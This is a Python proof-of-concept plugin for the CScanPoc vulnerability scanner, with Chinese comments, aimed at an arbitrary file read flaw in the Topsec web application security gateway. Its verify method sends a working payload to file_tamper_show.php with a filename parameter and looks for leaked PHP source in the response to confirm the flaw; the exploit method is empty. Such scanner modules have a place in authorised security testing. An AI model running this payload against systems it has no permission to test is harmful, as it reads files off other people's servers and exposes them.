# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'TOPSEC_0003'  # 平台漏洞编号，留空
    name = '天融信WEB应用安全网关 任意文件读取'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-07-31'  # 漏洞公布时间
    desc = '''
        天融信WEB应用安全网关 /function/content/tamper/file_tamper_show.php 页面任意文件读取。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '天融信'  # 漏洞应用名称
    product_version = '天融信WEB应用安全网关'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'b16cb4ac-c342-4f5e-b391-d4544957c838'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #ref http://www.wooyun.org/bugs/wooyun-2015-0130560
            payload = '/function/content/tamper/file_tamper_show.php?filename=file_tamper_show.php'
            verify_url = self.target + payload
            req = requests.get(verify_url)
            content = req.content

            if req.status_code == 200 and ('?php' in content) and ('file_get_contents' in content):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
